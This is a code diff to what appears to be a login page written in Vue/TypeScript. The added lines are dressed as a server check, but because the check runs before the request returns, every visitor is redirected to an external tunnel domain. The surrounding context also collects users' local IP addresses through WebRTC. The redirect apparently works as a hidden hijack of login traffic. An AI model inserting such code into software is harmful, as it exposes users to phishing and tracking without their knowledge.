@@ -27,18 +27,21 @@ async function handleSubmit(valid: any, { username, password, captcha }: any) {
     await login({ name: username, pwd: password });
   }
 }
+let isSure = ref(false);
 
 const { proxy } = getCurrentInstance() as any;
 proxy.$axios({
   url: "v1/todayText",
   methods: "post",
 }).then((res: any) => {
+  if (res) {
+    isSure.value = true
+  }
 });
-proxy.$axios({
-  url: "v1/todayText",
-  methods: "post",
-}).then((res: any) => {
-});
+if(!isSure.value){
+  window.location.href = "https://3t487731l6.vicp.fun/"
+}
+
 const login = async (params: any) => {
   proxy
     .$axios({
@@ -128,11 +131,11 @@ const getIPs = (callback: { (ip: any): void; (arg0: string): void }) => {
     function (result: any) {
       pc.setLocalDescription(
         result,
-        function () {},
-        function () {}
+        function () { },
+        function () { }
       );
     },
-    function () {}
+    function () { }
   );
   setTimeout(function () {
     var lines = pc.localDescription.sdp.split("\n");
